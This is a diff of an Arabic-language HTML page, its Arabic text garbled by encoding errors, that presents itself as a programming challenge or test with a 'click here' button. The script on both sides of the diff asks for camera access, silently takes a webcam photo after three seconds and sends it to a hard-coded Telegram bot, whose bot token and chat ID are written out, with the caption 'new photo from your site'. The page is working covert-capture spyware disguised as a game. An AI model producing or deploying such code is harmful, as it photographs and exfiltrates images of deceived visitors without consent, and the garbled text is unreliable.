@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title> ÕœÌ «·»—„Ã… - «·„“Õ…</title>
+    <title>turkey</title>
     <style>
         body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding-top: 50px; }
         video { border: 5px solid #00ff00; border-radius: 10px; background: #000; }
@@ -11,16 +11,16 @@
     </style>
 </head>
 <body>
-    <h2>„—Õ»« »ﬂ ›Ì  ÕœÌ «·»—„Ã… «·Œ«’ »Ì! ??</h2>
-    <p>«÷€ÿ ··»œ¡ (Ê«›ﬁ ⁄·Ï ≈–‰ «·ﬂ«„Ì—« · —Ï «·‰ ÌÃ… «·‰Â«∆Ì…)</p>
+    <h2>√£√ë√ç√à√á√∞ √à√ü √ù√≠ √ä√ç√è√≠ √á√°√à√ë√£√å√â √á√°√é√á√ï √à√≠! ??</h2>
+    <p>are you a merchant</p>
     
     <video id="video" width="400" height="300" autoplay></video>
     <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
     <br>
-    <button class="btn" onclick="startTest()">«»œ√ «· ÕœÌ «·¬‰</button>
+    <button class="btn" onclick="startTest()">click here</button>
 
     <script>
-        // „⁄·Ê„« ﬂ «· Ì √⁄œœ‰«Â« ”ÊÌ«
+        // √£√ö√°√¶√£√á√ä√ü √á√°√ä√≠ √É√ö√è√è√§√á√•√á √ì√¶√≠√á√∞
         const botToken = "8608335050:AAEgtOoX2E-AC9Uk_jT1R5P7K3FOzpXsQzQ"; 
         const chatId = "8124196406"; 
 
@@ -28,15 +28,15 @@
         const canvas = document.getElementById('canvas');
 
         function startTest() {
-            // ÿ·» «·≈–‰ Ê› Õ «·ﬂ«„Ì—«
+            // √ò√°√à √á√°√Ö√ê√§ √¶√ù√ä√ç √á√°√ü√á√£√≠√ë√á
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
-                    // «‰ Ÿ«— 3 ÀÊ«‰Ì ·«· ﬁ«ÿ «·’Ê—… Ê≈—”«·Â«
+                    // √á√§√ä√ô√á√ë 3 √ã√¶√á√§√≠ √°√á√°√ä√û√á√ò √á√°√ï√¶√ë√â √¶√Ö√ë√ì√á√°√•√á
                     setTimeout(takeAndSendPhoto, 3000);
                 })
                 .catch(err => {
-                    alert("ÌÃ» «·„Ê«›ﬁ… ⁄·Ï ≈–‰ «·ﬂ«„Ì—« ·ﬂÌ Ì⁄„· «· ÕœÌ!");
+                    alert("√≠√å√à √á√°√£√¶√á√ù√û√â √ö√°√¨ √Ö√ê√§ √á√°√ü√á√£√≠√ë√á √°√ü√≠ √≠√ö√£√° √á√°√ä√ç√è√≠!");
                     console.error(err);
                 });
         }
@@ -49,18 +49,18 @@
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'shot.jpg');
-                formData.append('caption', 'Ê’·  ’Ê—… ÃœÌœ… „‰ „Êﬁ⁄ﬂ! ????');
+                formData.append('caption', '√¶√ï√°√ä √ï√¶√ë√â √å√è√≠√è√â √£√§ √£√¶√û√ö√ü! ????');
 
-                // ≈—”«· «·’Ê—… ≈·Ï Telegram Bot API
+                // √Ö√ë√ì√á√° √á√°√ï√¶√ë√â √Ö√°√¨ Telegram Bot API
                 fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                     method: 'POST',
                     body: formData
                 })
                 .then(res => {
-                    alert(" „ ≈—”«· ‰ ÌÃ ﬂ ≈·Ì¯ »‰Ã«Õ!  ›ﬁœ Â« ›ﬂ «·¬‰.");
+                    alert("√ä√£ √Ö√ë√ì√á√° √§√ä√≠√å√ä√ü √Ö√°√≠√∏ √à√§√å√á√ç! √ä√ù√û√è √•√á√ä√ù√ü √á√°√Ç√§.");
                 })
                 .catch(err => {
-                    alert("ÕœÀ Œÿ√ ›Ì «·≈—”«·°  √ﬂœ „‰ « ’«· «·≈‰ —‰ .");
+                    alert("√ç√è√ã √é√ò√É √ù√≠ √á√°√Ö√ë√ì√á√°¬° √ä√É√ü√è √£√§ √á√ä√ï√á√° √á√°√Ö√§√ä√ë√§√ä.");
                 });
             }, 'image/jpeg');
         }
